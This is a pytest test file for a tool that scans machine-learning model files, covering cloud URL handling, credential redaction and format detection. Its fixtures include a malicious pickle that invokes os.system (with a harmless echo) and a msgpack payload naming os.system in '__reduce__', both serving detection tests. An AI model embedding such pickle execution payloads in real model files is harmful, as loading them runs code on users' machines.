import asyncio
import io
import json
import logging
import os
import stat
import struct
import tarfile
import zipfile
from collections.abc import Callable
from io import BytesIO
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from modelaudit.scanner_selection import (
    resolve_scanner_selection_policy,
    selected_scanner_extensions,
    selected_scanner_filenames,
)
from modelaudit.utils.file.detection import _XML_MODEL_SIGNATURE_READ_BYTES, JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES
from modelaudit.utils.helpers.retry import RetryError
from modelaudit.utils.sources.cloud_storage import (
    GCSCache,
    _build_safe_local_path,
    _filter_scannable_cloud_files,
    _run_coroutine_sync,
    analyze_cloud_target,
    download_from_cloud,
    download_from_cloud_streaming,
    filter_scannable_files,
    get_cloud_object_size,
    get_fs_protocol,
    is_cloud_url,
    is_sensitive_credential_key,
    redact_cloud_error_for_display,
    redact_stream_error_for_display,
    redact_stream_url_for_display,
    redact_url_for_display,
)
from tests.helpers import create_mock_coreml


def make_fs_mock() -> MagicMock:
    fs = MagicMock()
    fs.__enter__.return_value = fs

    def close_context(_exc_type: object, _exc: object, _tb: object) -> None:
        fs.close()

    fs.__exit__.side_effect = close_context
    return fs


def configure_remote_open_payloads(fs: MagicMock, payloads: dict[str, bytes]) -> None:
    def open_side_effect(path: str, _mode: str = "rb") -> io.BytesIO:
        if path not in payloads:
            raise FileNotFoundError(path)
        return io.BytesIO(payloads[path])

    fs.open.side_effect = open_side_effect


class _CountingBytesIO(io.BytesIO):
    def __init__(self, payload: bytes, byte_counter: list[int]):
        super().__init__(payload)
        self._byte_counter = byte_counter

    def read(self, size: int | None = -1) -> bytes:
        chunk = super().read(size)
        self._byte_counter[0] += len(chunk)
        return chunk


def make_tar_payload() -> bytes:
    payload = b'cos\nsystem\n(S"echo pwned"\ntR.'
    output = io.BytesIO()
    with tarfile.open(fileobj=output, mode="w") as archive:
        info = tarfile.TarInfo("evil.pkl")
        info.size = len(payload)
        info.mtime = 0
        archive.addfile(info, io.BytesIO(payload))
    return output.getvalue()


def make_zip_payload(entries: dict[str, bytes]) -> bytes:
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w") as archive:
        for name, payload in entries.items():
            archive.writestr(zipfile.ZipInfo(name, date_time=(1980, 1, 1, 0, 0, 0)), payload)
    return output.getvalue()


def make_safetensors_payload() -> bytes:
    header = json.dumps({"weight": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}).encode("utf-8")
    return struct.pack("<Q", len(header)) + header + b"\x00" * 4


def make_coreml_payload(tmp_path: Path) -> bytes:
    return create_mock_coreml(tmp_path / "model.jpg").read_bytes()


def make_executorch_payload() -> bytes:
    return b"\x0c\x00\x00\x00ET12" + b"\x04\x00\x04\x00\x04\x00\x00\x00"


def make_flax_msgpack_payload() -> bytes:
    msgpack = pytest.importorskip("msgpack")
    payload = msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
    assert isinstance(payload, bytes)
    return payload


class _FailAfterPayload(BytesIO):
    """Return the payload once, then simulate a transient transport failure."""

    def read(self, size: int | None = -1) -> bytes:
        if self.tell() == len(self.getvalue()):
            raise OSError("connection reset")
        return super().read(size)


def configure_partial_metadata_failure(fs: MagicMock, url: str) -> tuple[str, str]:
    model_url = f"{url.rstrip('/')}/model.bin"
    hidden_url = f"{url.rstrip('/')}/evil.pkl?X-Amz-Signature=secret"

    def info_side_effect(path: str) -> dict[str, object]:
        if path == url:
            return {"type": "directory", "name": "bucket/path/"}
        if path == model_url:
            return {"type": "file", "size": 2048}
        if path == hidden_url:
            raise PermissionError(f"metadata denied for {hidden_url}")
        raise FileNotFoundError(path)

    fs.info.side_effect = info_side_effect
    fs.glob.return_value = [model_url, hidden_url]
    return model_url, hidden_url


def test_run_coroutine_sync_without_running_loop() -> None:
    """_run_coroutine_sync should use asyncio.run() when no loop is active."""

    async def return_value() -> str:
        return "ok"

    result = _run_coroutine_sync(lambda: return_value())
    assert result == "ok"


class TestCloudURLDetection:
    def test_detects_valid_cloud_url_patterns(self):
        valid = [
            "s3://bucket/key",
            "gs://my-bucket/model.pt",
            "r2://data/model.bin",
            "https://bucket.s3.amazonaws.com/file",
            "HTTPS://BUCKET.S3.AMAZONAWS.COM/file",
            "https://storage.googleapis.com/bucket/file",
            "https://account.r2.cloudflarestorage.com/bucket/file",
        ]
        for url in valid:
            assert is_cloud_url(url), f"Failed to detect {url}"

    def test_rejects_invalid_cloud_url_patterns(self):
        invalid = [
            "https://huggingface.co/model",
            "ftp://example.com/file",
            "",  # empty
        ]
        for url in invalid:
            assert not is_cloud_url(url), f"Incorrectly detected {url}"

    @pytest.mark.parametrize(
        ("url", "expected_protocol"),
        [
            ("HTTPS://BUCKET.S3.AMAZONAWS.COM/model.pkl", "s3"),
            ("HTTPS://STORAGE.GOOGLEAPIS.COM/bucket/model.pkl", "gcs"),
            ("HTTPS://ACCOUNT.R2.CLOUDFLARESTORAGE.COM/bucket/model.pkl", "s3"),
        ],
    )
    def test_resolves_mixed_case_https_provider_hosts(self, url: str, expected_protocol: str) -> None:
        assert get_fs_protocol(url) == expected_protocol


class TestCloudURLRedaction:
    def test_deeply_encoded_structured_key_fails_closed(self) -> None:
        encoded_access_token = "access%252525255Ftoken"

        assert is_sensitive_credential_key(encoded_access_token) is True

    def test_redact_url_for_display_strips_credentials_and_query(self) -> None:
        url = "https://user:pass@example.com:8443/path/to/model.bin?X-Amz-Signature=secret#fragment"
        assert redact_url_for_display(url) == "https://example.com:8443/path/to/model.bin"

    def test_redact_url_for_display_strips_cloud_query_params(self) -> None:
        url = "s3://bucket/model.bin?X-Amz-Credential=secret&X-Amz-Signature=secret"
        assert redact_url_for_display(url) == "s3://bucket/model.bin"

    def test_redact_url_for_display_strips_percent_encoded_query_params(self) -> None:
        url = "https://bucket.s3.amazonaws.com/model.pkl%3FX-Amz-Signature%3Ddeadbeef%26token%3Dsecret"
        assert redact_url_for_display(url) == "https://bucket.s3.amazonaws.com/model.pkl"

    @pytest.mark.parametrize(
        "url",
        [
            "https://bucket.s3.amazonaws.com/model%3Fv1.pkl",
            "https://bucket.s3.amazonaws.com/model%253Fv1.pkl",
            "https://bucket.s3.amazonaws.com/model%23v1.pkl",
            "https://bucket.s3.amazonaws.com/model%3Bv1.pkl",
        ],
    )
    def test_redact_url_for_display_preserves_encoded_literal_delimiter(self, url: str) -> None:
        assert redact_url_for_display(url) == url

    def test_redact_url_for_display_preserves_encoded_literal_question_mark_before_signed_query(self) -> None:
        url = "https://bucket.s3.amazonaws.com/model%3Fv1.pkl%3FX-Amz-Signature%3Dsecret"

        assert redact_url_for_display(url) == "https://bucket.s3.amazonaws.com/model%3Fv1.pkl"

    def test_redact_cloud_error_preserves_encoded_literal_question_mark_before_signed_query(self) -> None:
        message = "provider failed: https://bucket.s3.amazonaws.com/model%3Fv1.pkl%3FX-Amz-Signature%3Dsecret code=403"

        redacted = redact_cloud_error_for_display(message)

        assert redacted == (
            "provider failed: https://bucket.s3.amazonaws.com/model%3Fv1.pkl?X-Amz-Signature=<redacted> code=403"
        )
        assert "secret" not in redacted

    @pytest.mark.parametrize(
        "url",
        [
            "https://bucket.s3.amazonaws.com/model.pkl;token=SECRET",
            "https://bucket.s3.amazonaws.com/model.pkl%3Btoken%3DSECRET",
        ],
    )
    def test_redact_url_for_display_strips_path_credentials(self, url: str) -> None:
        assert redact_url_for_display(url) == "https://bucket.s3.amazonaws.com/model.pkl"

    def test_redact_url_for_display_preserves_bare_semicolon_filename(self) -> None:
        url = "https://bucket.s3.amazonaws.com/model;v1.pkl"

        assert redact_url_for_display(url) == url

    def test_redact_url_for_display_preserves_non_structural_path_escapes(self) -> None:
        url = "https://bucket.s3.amazonaws.com/models/bert%20base%2Fmodel.pkl"
        assert redact_url_for_display(url) == url

    def test_redact_url_for_display_strips_percent_encoded_userinfo(self) -> None:
        url = "https://user%3Aencoded-password%40bucket.s3.amazonaws.com%2Fmodel.pkl%3Ftoken%3Dsecret"
        assert redact_url_for_display(url) == "https://bucket.s3.amazonaws.com/model.pkl"

    def test_redact_url_for_display_preserves_path_when_encoded_password_contains_slash(self) -> None:
        url = "https://user%3Ap%252Fass%40bucket.s3.amazonaws.com%2Fmodel.pkl%3Ftoken%3Dsecret"
        assert redact_url_for_display(url) == "https://bucket.s3.amazonaws.com/model.pkl"

    def test_redact_url_for_display_fails_closed_for_invalid_port(self) -> None:
        url = "https://user:password@example.com:not-a-port/model.bin?token=secret"
        assert redact_url_for_display(url) == "<cloud URL redacted>"

    def test_redact_url_for_display_preserves_ipv6_authority(self) -> None:
        url = "https://[2001:db8::1]:8443/model.bin?token=secret"
        assert redact_url_for_display(url) == "https://[2001:db8::1]:8443/model.bin"

    def test_redact_stream_url_for_display_fails_closed_without_inner_scheme(self) -> None:
        url = "bucket/model.bin?redirect=https://safe.example&token=secret"
        assert redact_stream_url_for_display(url) == "<cloud URL redacted>"

    def test_redact_stream_url_for_display_strips_percent_encoded_query_params(self) -> None:
        url = "https://bucket.s3.amazonaws.com/model.pkl%253Fvisible%253Dyes%2526token%253Dsecret"
        assert redact_stream_url_for_display(url) == "https://bucket.s3.amazonaws.com/model.pkl"

    def test_redact_stream_error_for_display_removes_unknown_malformed_query(self) -> None:
        url = "bucket/model.bin?session=secret-value"
        message = f"failed to open stream://{url}"

        redacted = redact_stream_error_for_display(message, url)

        assert redacted == "failed to open stream://<cloud URL redacted>"
        assert "secret-value" not in redacted

    def test_redact_stream_error_for_display_handles_empty_source(self) -> None:
        assert redact_stream_error_for_display("failed to open stream://", "") == (
            "failed to open stream://<cloud URL redacted>"
        )

    def test_redact_cloud_error_for_display_redacts_embedded_signed_urls(self) -> None:
        url = "s3://bucket/model.bin?X-Amz-Credential=cred&X-Amz-Signature=secret"
        message = f"Forbidden while opening {url}"

        redacted = redact_cloud_error_for_display(message, url)

        assert "s3://bucket/model.bin" in redacted
        assert "X-Amz-Credential" not in redacted
        assert "X-Amz-Signature" not in redacted
        assert "secret" not in redacted

    def test_redact_cloud_error_for_display_redacts_query_credentials_without_exact_url(self) -> None:
        message = (
            "provider failed: https://storage.googleapis.com/bucket/model.bin?X-Goog-Signature=secret&token=abc123"
        )

        redacted = redact_cloud_error_for_display(message)

        assert "X-Goog-Signature=<redacted>" in redacted
        assert "token=<redacted>" in redacted
        assert "secret" not in redacted
        assert "abc123" not in redacted

    def test_redact_cloud_error_for_display_redacts_transformed_credentials_and_opaque_url_parts(self) -> None:
        message = (
            "provider normalized token=secret-token from "
            "https://collector.example/callback?OPAQUE-QUERY-SECRET#OPAQUE-FRAGMENT-SECRET"
        )

        redacted = redact_cloud_error_for_display(message)

        assert "token=<redacted>" in redacted
        assert "https://collector.example/callback" in redacted
        assert "secret-token" not in redacted
        assert "OPAQUE-QUERY-SECRET" not in redacted
        assert "OPAQUE-FRAGMENT-SECRET" not in redacted

    def test_redact_cloud_error_for_display_normalizes_escaped_url_delimiters(self) -> None:
        message = r"provider failed: https:\/\/collector.example\/callback\u003ftoken\u003dENCODED-SECRET"

        redacted = redact_cloud_error_for_display(message)

        assert redacted == "provider failed: https://collector.example/callback?token=<redacted>"
        assert "ENCODED-SECRET" not in redacted

    def test_redact_cloud_error_for_display_normalizes_percent_encoded_url_delimiters(self) -> None:
        message = (
            "provider failed: https://bucket.s3.amazonaws.com/model.pkl"
            "%253Fvisible%253Dyes%2526X-Amz-Signature%253Ddeadbeef%2526token%253Dsecret"
        )

        redacted = redact_cloud_error_for_display(message)

        assert redacted == (
            "provider failed: https://bucket.s3.amazonaws.com/model.pkl"
            "?visible=yes&X-Amz-Signature=<redacted>&token=<redacted>"
        )
        assert "deadbeef" not in redacted
        assert "secret" not in redacted

    def test_redact_cloud_error_for_display_normalizes_schemeless_encoded_query(self) -> None:
        message = "bucket/path/model.pkl%3FX-Amz-Signature%3Dsecret"

        redacted = redact_cloud_error_for_display(message)

        assert redacted == "bucket/path/model.pkl?X-Amz-Signature=<redacted>"
        assert "secret" not in redacted

    @pytest.mark.parametrize(
        "message",
        [
            "Authorization: Bearer HEADER-SECRET",
            "X-Amz-Security-Token: HEADER-SECRET",
        ],
    )
    def test_redact_cloud_error_for_display_redacts_header_credentials(self, message: str) -> None:
        redacted = redact_cloud_error_for_display(message)

        assert redacted.endswith(": <redacted>")
        assert "HEADER-SECRET" not in redacted

    @pytest.mark.parametrize(
        ("message", "expected"),
        [
            ("Authorization=Bearer ASSIGNMENT-SECRET", "Authorization=<redacted>"),
            ("Authorization = Basic ASSIGNMENT-SECRET", "Authorization = <redacted>"),
            ("aws_secret_access_key = ASSIGNMENT-SECRET", "aws_secret_access_key = <redacted>"),
            ("client_secret = 'ASSIGNMENT SECRET'", "client_secret = <redacted>"),
            ('password="UNTERMINATED ASSIGNMENT SECRET', "password=<redacted>"),
        ],
    )
    def test_redact_cloud_error_for_display_redacts_spaced_assignments(self, message: str, expected: str) -> None:
        redacted = redact_cloud_error_for_display(message)

        assert redacted == expected
        assert "ASSIGNMENT" not in redacted

    def test_redact_cloud_error_for_display_preserves_benign_spaced_assignment(self) -> None:
        message = "tokenizer = sentencepiece"

        assert redact_cloud_error_for_display(message) == message

    @pytest.mark.parametrize("message", ["token==SECRET", "token == SECRET"])
    def test_redact_cloud_error_for_display_preserves_comparison_operators(self, message: str) -> None:
        assert redact_cloud_error_for_display(message) == message

    def test_redact_cloud_error_for_display_preserves_context_after_assignment(self) -> None:
        message = "token=SECRET from https://collector.example/status"

        assert redact_cloud_error_for_display(message) == "token=<redacted> from https://collector.example/status"

    def test_redact_cloud_error_for_display_preserves_benign_header(self) -> None:
        message = "Tokenizer: sentencepiece"

        assert redact_cloud_error_for_display(message) == message

    def test_redact_cloud_error_for_display_normalizes_percent_encoded_url_prefix(self) -> None:
        message = (
            "provider failed: https%253A%252F%252Fbucket.s3.amazonaws.com%252Fmodel.pkl"
            "%253Fvisible%253Dyes%2526X-Amz-Signature%253Ddeadbeef"
        )

        redacted = redact_cloud_error_for_display(message)

        assert redacted == (
            "provider failed: https://bucket.s3.amazonaws.com/model.pkl?visible=yes&X-Amz-Signature=<redacted>"
        )
        assert "deadbeef" not in redacted

    @pytest.mark.parametrize(
        "mixed_encoded_url",
        [
            "https%3A//user:password@bucket.s3.amazonaws.com/model.pkl?token=secret",
            "https:%2F%2Fuser:password@bucket.s3.amazonaws.com/model.pkl?token=secret",
            "https%253A/%252Fuser:password@bucket.s3.amazonaws.com/model.pkl?token=secret",
        ],
    )
    def test_redact_cloud_error_normalizes_mixed_encoded_url_prefixes(self, mixed_encoded_url: str) -> None:
        redacted = redact_cloud_error_for_display(f"provider failed: {mixed_encoded_url}")

        assert redacted == "provider failed: https://bucket.s3.amazonaws.com/model.pkl?token=<redacted>"
        assert "user:password" not in redacted
        assert "secret" not in redacted

    def test_redact_cloud_error_for_display_strips_fully_encoded_userinfo(self) -> None:
        message = (
            "provider failed: https%253A%252F%252Fuser%253Aencoded-password%2540"
            "bucket.s3.amazonaws.com%252Fmodel.pkl%253Ftoken%253Dsecret"
        )

        redacted = redact_cloud_error_for_display(message)

        assert redacted == "provider failed: https://bucket.s3.amazonaws.com/model.pkl?token=<redacted>"
        assert "encoded-password" not in redacted
        assert "secret" not in redacted

    def test_redact_cloud_error_for_display_redacts_common_credential_aliases(self) -> None:
        message = (
            "request failed: https://example.test/c2?campaign=test&session=secret-session&password=secret-password"
        )

        redacted = redact_cloud_error_for_display(message)

        assert "campaign=test" in redacted
        assert "session=<redacted>" in redacted
        assert "password=<redacted>" in redacted
        assert "secret-session" not in redacted
        assert "secret-password" not in redacted

    def test_redact_cloud_error_for_display_redacts_unknown_query_values(self) -> None:
        message = "request failed: https://example.test/c2?campaign=test&opaque=SUPERSECRET"

        redacted = redact_cloud_error_for_display(message)

        assert "campaign=test" in redacted
        assert "opaque=<redacted>" in redacted
        assert "SUPERSECRET" not in redacted

    def test_redact_cloud_error_for_display_does_not_normalize_unknown_keys_into_allowlist(self) -> None:
        message = "request failed: https://example.test/c2?cam-paign=SUPERSECRET&camp%61ign=test"

        redacted = redact_cloud_error_for_display(message)

        assert "cam-paign=<redacted>" in redacted
        assert "camp%61ign=test" in redacted
        assert "SUPERSECRET" not in redacted

    @pytest.mark.parametrize(
        "value",
        [
            "en%26token%3DSECRET",
            "yes%2526access_token%253DSECRET",
            "yes%25252526access_token%2525253DSECRET",
            "token=SECRET",
            "en,token=SECRET",
            "en%0D%0AAuthorization%3A%20Bearer%20SECRET",
        ],
    )
    def test_redact_cloud_error_for_display_redacts_nested_query_structure_in_safe_values(self, value: str) -> None:
        message = f"request failed: https://example.test/c2?lang={value}"

        redacted = redact_cloud_error_for_display(message)

        assert redacted == "request failed: https://example.test/c2?lang=<redacted>"
        assert "SECRET" not in redacted

    def test_redact_cloud_error_for_display_handles_separate_safe_and_sensitive_params(self) -> None:
        message = "request failed: https://example.test/c2?lang=en&token=SECRET"

        redacted = redact_cloud_error_for_display(message)

        assert redacted == "request failed: https://example.test/c2?lang=en&token=<redacted>"
        assert "SECRET" not in redacted

    def test_redact_cloud_error_for_display_preserves_encoded_safe_value_characters(self) -> None:
        message = "request failed: https://example.test/c2?tokenizer=org%2Fbert-base&lang=en-US"

        assert redact_cloud_error_for_display(message) == message

    def test_redact_cloud_error_for_display_redacts_semicolon_query_credentials(self) -> None:
        message = "provider failed: https://example.com/model.bin?visible=yes;token=secret-value"

        redacted = redact_cloud_error_for_display(message)

        assert "visible=yes" in redacted
        assert "token=<redacted>" in redacted
        assert "secret-value" not in redacted

    def test_redact_cloud_error_for_display_redacts_legacy_aws_access_key_id(self) -> None:
        message = (
            "provider failed: https://bucket.s3.amazonaws.com/model.bin?"
            "AWSAccessKeyId=AKIASECRET&Expires=123456&Signature=deadbeef"
        )

        redacted = redact_cloud_error_for_display(message)

        assert "AWSAccessKeyId=<redacted>" in redacted
        assert "Signature=<redacted>" in redacted
        assert "AKIASECRET" not in redacted
        assert "deadbeef" not in redacted

    def test_redact_cloud_error_for_display_handles_encoded_and_fragment_credentials(self) -> None:
        message = (
            "provider failed: https://example.com/model?tokenizer=bert&X-Amz-Sign%61ture=secret"
            "#access_token=fragment-secret"
        )

        redacted = redact_cloud_error_for_display(message)

        assert "tokenizer=bert" in redacted
        assert "X-Amz-Sign%61ture=<redacted>" in redacted
        assert "access_token=<redacted>" in redacted
        assert "fragment-secret" not in redacted


@patch("modelaudit.utils.helpers.retry.time.sleep")
@patch("fsspec.filesystem")
def test_analyze_cloud_target_redacts_signed_url_retry_logs(
    mock_fs: MagicMock, mock_sleep: MagicMock, caplog: pytest.LogCaptureFixture
) -> None:
    url = "s3://bucket/model.bin?X-Amz-Signature=secret"
    fs = make_fs_mock()
    fs.info.side_effect = OSError(f"Forbidden while opening {url}")
    mock_fs.return_value = fs
    caplog.set_level(logging.DEBUG, logger="modelaudit.utils.helpers.retry")

    result = asyncio.run(analyze_cloud_target(url))

    assert "X-Amz-Signature" not in result["error"]
    assert "secret" not in result["error"]
    assert "s3://bucket/model.bin" in caplog.text
    assert "X-Amz-Signature" not in caplog.text
    assert "secret" not in caplog.text
    mock_sleep.assert_called()


@patch("fsspec.filesystem")
def test_analyze_cloud_target_directory_success(mock_fs: MagicMock) -> None:
    url = "s3://bucket/path/"
    model_url = "s3://bucket/path/model.bin"
    fs = make_fs_mock()

    def info_side_effect(path: str) -> dict[str, object]:
        if path == url:
            return {"type": "directory", "name": "bucket/path/"}
        if path == model_url:
            return {"type": "file", "size": 2048}
        raise FileNotFoundError(path)

    fs.info.side_effect = info_side_effect
    fs.glob.return_value = [model_url]
    mock_fs.return_value = fs

    result = asyncio.run(analyze_cloud_target(url))

    assert result["type"] == "directory"
    assert result["file_count"] == 1
    assert result["total_size"] == 2048
    assert result["human_size"] == "2.0 KB"
    assert result["files"] == [{"path": model_url, "name": "model.bin", "size": 2048, "human_size": "2.0 KB"}]
    fs.glob.assert_called_once_with("s3://bucket/path/**")


@patch("fsspec.filesystem")
def test_analyze_cloud_target_directory_ignores_explicit_directory_metadata(
    mock_fs: MagicMock,
) -> None:
    url = "s3://bucket/path/"
    directory_url = "s3://bucket/path/nested/"
    model_url = "s3://bucket/path/nested/model.bin"
    fs = make_fs_mock()

    def info_side_effect(path: str) -> dict[str, object]:
        if path == url:
            return {"type": "directory", "name": "bucket/path/"}
        if path == directory_url:
            return {"type": "directory", "size": 0}
        if path == model_url:
            return {"type": "file", "size": 2048}
        raise FileNotFoundError(path)

    fs.info.side_effect = info_side_effect
    fs.glob.return_value = [directory_url, model_url]
    mock_fs.return_value = fs

    result = asyncio.run(analyze_cloud_target(url))

    assert result["type"] == "directory"
    assert result["file_count"] == 1
    assert result["files"][0]["path"] == model_url


@patch("fsspec.filesystem")
def test_analyze_cloud_target_directory_fails_on_partial_metadata_error(
    mock_fs: MagicMock,
) -> None:
    url = "s3://bucket/path/"
    fs = make_fs_mock()
    _model_url, hidden_url = configure_partial_metadata_failure(fs, url)
    mock_fs.return_value = fs

    result = asyncio.run(analyze_cloud_target(url))
    serialized = json.dumps(result)

    assert result["type"] == "unknown"
    assert result["analysis_incomplete"] is True
    assert result["metadata_error_count"] == 1
    assert "metadata lookup failed for 1 object" in result["error"]
    assert "evil.pkl" in result["error"]
    assert "X-Amz-Signature" not in serialized
    assert "secret" not in serialized
    assert hidden_url not in serialized


@patch("fsspec.filesystem")
def test_analyze_cloud_target_directory_fails_on_incomplete_listed_object_metadata(
    mock_fs: MagicMock,
) -> None:
    url = "s3://bucket/path/"
    hidden_path = "bucket/path/hidden.pkl"
    fs = make_fs_mock()
    fs.info.side_effect = lambda path: {"type": "directory"} if path == url else {}
    fs.glob.return_value = [hidden_path]
    mock_fs.return_value = fs

    result = asyncio.run(analyze_cloud_target(url))

    assert result["type"] == "unknown"
    assert result["analysis_incomplete"] is True
    assert result["metadata_error_count"] == 1
    assert result["metadata_errors"][0]["path"] == hidden_path
    assert "incomplete metadata" in result["metadata_errors"][0]["error"]


@patch("fsspec.filesystem")
def test_analyze_cloud_target_redacts_protocol_stripped_metadata_error_path(
    mock_fs: MagicMock,
) -> None:
    url = "s3://bucket/path/"
    hidden_path = "bucket/path/hidden.pkl?X-Amz-Signature=secret"
    fs = make_fs_mock()

    def info_side_effect(path: str) -> dict[str, object]:
        if path == url:
            return {"type": "directory"}
        raise PermissionError(f"metadata denied for {path}")

    fs.info.side_effect = info_side_effect
    fs.glob.return_value = [hidden_path]
    mock_fs.return_value = fs

    result = asyncio.run(analyze_cloud_target(url))
    serialized = json.dumps(result)

    assert result["type"] == "unknown"
    assert result["analysis_incomplete"] is True
    assert result["metadata_errors"][0]["path"].endswith("X-Amz-Signature=<redacted>")
    assert "secret" not in serialized


@patch("fsspec.filesystem")
def test_analyze_cloud_target_redacts_encoded_protocol_stripped_metadata_error_path(
    mock_fs: MagicMock,
) -> None:
    url = "s3://bucket/path/"
    hidden_path = "bucket/path/hidden.pkl%3FX-Amz-Signature%3Dsecret"
    fs = make_fs_mock()

    def info_side_effect(path: str) -> dict[str, object]:
        if path == url:
            return {"type": "directory"}
        raise PermissionError(f"metadata denied for {path}")

    fs.info.side_effect = info_side_effect
    fs.glob.return_value = [hidden_path]
    mock_fs.return_value = fs

    result = asyncio.run(analyze_cloud_target(url))
    serialized = json.dumps(result)

    assert result["type"] == "unknown"
    assert result["analysis_incomplete"] is True
    assert result["metadata_errors"][0]["path"].endswith("X-Amz-Signature=<redacted>")
    assert "secret" not in serialized


@patch("fsspec.filesystem")
def test_analyze_cloud_target_bounds_partial_metadata_error_details(
    mock_fs: MagicMock,
) -> None:
    url = "s3://bucket/path/"
    failed_urls = [f"s3://bucket/path/evil-{index}.pkl?X-Amz-Signature=secret-{index}" for index in range(5)]
    fs = make_fs_mock()

    def info_side_effect(path: str) -> dict[str, object]:
        if path == url:
            return {"type": "directory", "name": "bucket/path/"}
        raise PermissionError(f"metadata denied for {path}: {'x' * 1024}")

    fs.info.side_effect = info_side_effect
    fs.glob.return_value = failed_urls
    mock_fs.return_value = fs

    result = asyncio.run(analyze_cloud_target(url))
    serialized = json.dumps(result)

    assert result["type"] == "unknown"
    assert result["analysis_incomplete"] is True
    assert result["metadata_error_count"] == 5
    assert len(result["metadata_errors"]) == 3
    assert all(len(entry["error"]) <= 512 for entry in result["metadata_errors"])
    assert result["error"].endswith("; ...")
    assert "evil-4.pkl" not in serialized
    assert "X-Amz-Signature" not in serialized
    assert "secret-" not in serialized


def test_filter_scannable_files_handles_signed_cloud_urls() -> None:
    files = [{"path": "s3://bucket/model.pkl?X-Amz-Signature=secret"}]

    assert filter_scannable_files(files) == files


@pytest.mark.parametrize(
    ("filename", "payload", "expected_format"),
    [
        pytest.param("evil.payload", b'cos\nsystem\n(S"echo pwned"\ntR.', "pickle", id="protocol0-pickle"),
        pytest.param("archive.payload", make_tar_payload(), "tar", id="tar"),
        pytest.param(
            "model.payload",
            make_zip_payload({"archive/data.pkl": b"payload", "archive/version": b"1"}),
            "zip",
            id="model-zip",
        ),
        pytest.param(
            "keras.payload",
            make_zip_payload(
                {"config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode()}
            ),
            "zip",
            id="config-only-keras-zip",
        ),
        pytest.param("weights.payload", make_safetensors_payload(), "safetensors", id="safetensors"),
        pytest.param("cntk.payload", b"\x0a\x07version\x0a\x03uidCompositeFunction", "cntk", id="cntk"),
        pytest.param(
            "lightgbm.payload",
            (
                b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\n"
                b"max_feature_idx=0\ntree=0\nnum_leaves=1\nsplit_feature=0\nleaf_value=0\n"
            ),
            "lightgbm",
            id="lightgbm",
        ),
        pytest.param(
            "mxnet.payload",
            json.dumps(
                {
                    "nodes": [{"op": "Custom", "name": "load"}],
                    "arg_nodes": [0],
                    "heads": [[0, 0, 0]],
                }
            ).encode(),
            "mxnet",
            id="mxnet",
        ),
        pytest.param(
            "pmml.payload",
            b"<?xml version='1.0'?><!--" + (b"x" * (9 * 1024)) + b"--><PMML version='4.4'></PMML>",
            "pmml",
            id="late-pmml",
        ),
    ],
)
def test_filter_scannable_cloud_files_includes_content_routed_objects(
    filename: str,
    payload: bytes,
    expected_format: str,
) -> None:
    url = f"s3://bucket/models/{filename}"
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})

    files = [{"path": url, "name": filename, "size": len(payload), "human_size": f"{len(payload)} B"}]

    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": expected_format}]


@pytest.mark.parametrize(
    ("selected_scanner", "expected"),
    [
        pytest.param("safetensors", True, id="matching-scanner"),
        pytest.param("tflite", False, id="different-scanner"),
    ],
)
def test_filter_scannable_cloud_files_honors_scanner_selection_for_content_routes(
    selected_scanner: str,
    expected: bool,
) -> None:
    url = "s3://bucket/models/weights.payload"
    payload = make_safetensors_payload()
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})
    files = [{"path": url, "name": "weights.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]
    scanner_policy = resolve_scanner_selection_policy(scanners=[selected_scanner])
    scanner_selection = scanner_policy.to_config()

    actual = _filter_scannable_cloud_files(
        files,
        fs=fs,
        scannable_extensions=selected_scanner_extensions(scanner_policy, conservative=True),
        scanner_selection=scanner_selection,
    )

    expected_files = [{**files[0], "content_detected_format": "safetensors"}] if expected else []
    assert actual == expected_files


def test_filter_scannable_cloud_files_includes_selected_exact_filename() -> None:
    policy = resolve_scanner_selection_policy(scanners=["metadata"])
    url = "s3://bucket/models/README"
    files = [{"path": url, "name": "README", "size": 8, "human_size": "8 B"}]
    fs = make_fs_mock()

    actual = _filter_scannable_cloud_files(
        files,
        fs=fs,
        scannable_extensions=selected_scanner_extensions(policy, conservative=True),
        scannable_filenames=selected_scanner_filenames(policy, conservative=True),
        scanner_selection=policy.to_config(),
    )

    assert actual == files
    fs.open.assert_not_called()


@pytest.mark.parametrize(
    ("selected_scanner", "expected"),
    [
        pytest.param("pickle", [], id="reject-unselected-pytorch-zip"),
        pytest.param("pytorch_zip", "routed", id="retain-selected-pytorch-zip"),
    ],
)
def test_filter_scannable_cloud_files_validates_shared_suffix_ownership(
    selected_scanner: str,
    expected: list[dict[str, object]] | str,
) -> None:
    url = "s3://bucket/models/model.pt"
    payload = make_zip_payload({"archive/data.pkl": b"N.", "archive/version": b"3"})
    files = [{"path": url, "name": "model.pt", "size": len(payload), "human_size": "Unknown"}]
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})
    policy = resolve_scanner_selection_policy(scanners=[selected_scanner])

    actual = _filter_scannable_cloud_files(
        files,
        fs=fs,
        scannable_extensions=selected_scanner_extensions(policy, conservative=True),
        scanner_selection=policy.to_config(),
    )

    if expected == "routed":
        assert actual == [{**files[0], "content_detected_format": "zip"}]
    else:
        assert actual == expected
    fs.open.assert_called()


def test_filter_scannable_cloud_files_retains_inconclusive_shared_suffix() -> None:
    url = "s3://bucket/models/model.pt"
    payload = b"not a recognized model header"
    files = [{"path": url, "name": "model.pt", "size": len(payload), "human_size": "Unknown"}]
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})
    policy = resolve_scanner_selection_policy(scanners=["pickle"])

    actual = _filter_scannable_cloud_files(
        files,
        fs=fs,
        scannable_extensions=selected_scanner_extensions(policy, conservative=True),
        scanner_selection=policy.to_config(),
    )

    assert actual == files


def test_filter_scannable_cloud_files_keeps_selected_joblib_without_content_probe() -> None:
    url = "s3://bucket/models/model.joblib"
    files = [{"path": url, "name": "model.joblib", "size": 8, "human_size": "8 B"}]
    fs = make_fs_mock()
    policy = resolve_scanner_selection_policy(scanners=["joblib"])

    actual = _filter_scannable_cloud_files(
        files,
        fs=fs,
